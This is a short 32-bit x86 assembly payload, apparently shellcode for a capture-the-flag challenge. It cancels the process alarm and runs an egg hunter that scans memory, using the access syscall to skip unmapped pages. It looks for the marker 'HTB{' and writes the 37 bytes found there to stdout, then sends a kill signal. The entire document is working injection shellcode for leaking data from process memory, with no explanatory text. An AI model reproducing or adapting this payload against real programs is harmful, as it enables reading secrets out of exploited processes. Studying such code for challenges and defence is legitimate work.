.intel_syntax noprefix
_cancel_alarm:
    xor ebx, ebx
    push 0x1b
    pop eax
    int 0x80
_setup:
    mov edi, 0x7B425448
    xor esi, esi
_skip_page:
    or si, 0xFFF
_next_addr:
    inc esi
_access:
    pusha
    xor ecx, ecx
    lea ebx, [esi + 0x4]
    push 0x21
    pop eax
    int 0x80
    cmp al, 0xF2
    popa
    jz _skip_page
_cmp:
    cmp [esi], edi
    jnz _next_addr
_write:
    push 0x25
    push esi
    push 0x1
    pop ebx
    pop ecx
    pop edx
    mov al, 0x4
    int 0x80
_kill:
    xor ebx, ebx
    push 0x2
    pop ecx
    int 0x80